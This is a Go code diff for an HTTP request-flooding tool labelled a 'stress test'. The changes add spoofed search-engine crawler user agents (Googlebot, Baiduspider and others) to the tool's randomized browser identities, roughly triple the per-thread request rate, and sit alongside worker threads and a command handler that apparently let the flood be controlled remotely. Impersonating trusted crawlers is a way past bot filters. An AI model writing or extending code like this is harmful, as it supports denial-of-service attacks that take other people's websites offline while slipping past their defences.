@@ -37,8 +37,17 @@ var (
 	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
 	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
 	choice4 = []string{"Linux i686", "Linux x86_64"}
-	choice5 = []string{"chrome", "firefox", "edge", "safari"}
+	choice5 = []string{"chrome", "firefox", "edge", "safari", "spider"}
 	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
+	spider  = []string{
+		"AdsBot-Google ( http://www.google.com/adsbot.html)",
+		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
+		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
+		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
+		"Googlebot-Image/1.0",
+		"Googlebot-News",
+		"Googlebot-Video/1.0",
+	}
 )
 
 func init() {
@@ -66,10 +75,11 @@ func getUserAgent() string {
 	} else if browser == "edge" {
 		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
 		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edge/%s", os, version, version)
-	} else {
+	} else if browser == "safari" {
 		version := fmt.Sprintf("%d.0", rand.Intn(99))
 		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Version/%s Safari/537.36", os, version)
 	}
+	return spider[rand.Intn(len(spider))]
 }
 
 func getHeader() string {
@@ -85,6 +95,7 @@ func getHeader() string {
 	header += "Connection: keep-alive\r\n\r\n"
 	return header
 }
+
 
 func worker(ctx context.Context, id int, wg *sync.WaitGroup, requestCount chan int) {
 	defer wg.Done()
@@ -147,6 +158,9 @@ func startTest(urlStr string, threads, timer int, cookieStr string) {
 	}
 	cookie = cookieStr
 
+	// Log the details about the stress test being started
+	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
+
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timer)*time.Second)
 	cancelFunc = cancel
 
@@ -166,7 +180,7 @@ func startTest(urlStr string, threads, timer int, cookieStr string) {
 		for t := 0; t < timer; t++ {
 			<-ticker.C
 			for i := 0; i < threads; i++ {
-				requestCount <- rand.Intn(151) + 50 // Randomized load per thread
+				requestCount <- rand.Intn(401) + 200 // Randomized load per thread
 			}
 		}
 		close(requestCount)
@@ -178,6 +192,7 @@ func startTest(urlStr string, threads, timer int, cookieStr string) {
 	mu.Unlock()
 	fmt.Println("Stress test completed.")
 }
+
 
 func controlHandler(w http.ResponseWriter, r *http.Request) {
 	var cmd Command
